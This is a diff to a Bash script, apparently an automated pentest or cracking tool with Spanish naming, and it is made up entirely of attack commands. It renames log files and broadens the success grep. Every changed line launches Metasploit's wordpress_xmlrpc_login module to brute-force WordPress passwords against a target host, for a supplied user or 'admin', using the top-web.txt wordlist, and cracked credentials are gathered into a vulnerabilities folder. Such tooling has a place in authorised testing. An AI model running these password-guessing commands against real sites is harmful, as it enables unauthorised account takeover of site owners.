@@ -239,11 +239,11 @@ then
 					#Dominio
 					if [[ "$ip" == *"bo" || "$ip" == *"com"  || "$ip" == *"net" || "$ip" == *"org" || "$ip" == *"net" ]];then 
 						real_ip=`host $ip | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME $user ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi			
 				done
 			else
@@ -251,14 +251,14 @@ then
 				#$ip = dominio
 					if [[ "$ip" == *"bo" || "$ip" == *"com"  || "$ip" == *"net" || "$ip" == *"org" || "$ip" == *"net" ]];then 
 						real_ip=`host $ip | head -1 | cut -d " " -f4` 
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $real_ip;set VHOST $ip; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					else
-						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
-						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null
+						echo "msfconsole -x \"use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit\""  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
+						msfconsole -x "use auxiliary/scanner/http/wordpress_xmlrpc_login;set PASS_FILE top-web.txt;set ENUMERATE_USERNAMES 0;set rhosts $ip; set rport $port; set USERNAME admin ; set TARGETURI $path ;run;exit"  >> logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null
 					fi										
 			fi						
-			grep --color=never 'SUCCESSFUL' logs/cracking/"$ip"_"$port"_wordpressPass.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_wordpressPass.txt 									
+			grep --color=never -i 'SUCCESS' logs/cracking/"$ip"_"$port"_passwordAdivinadoServ.txt 2>/dev/null | sort | uniq > .vulnerabilidades/"$ip"_"$port"_passwordAdivinadoServ.txt 									
 		fi	
 		
 		if [[ $fingerprint = *"phpmyadmin"* ]]; then
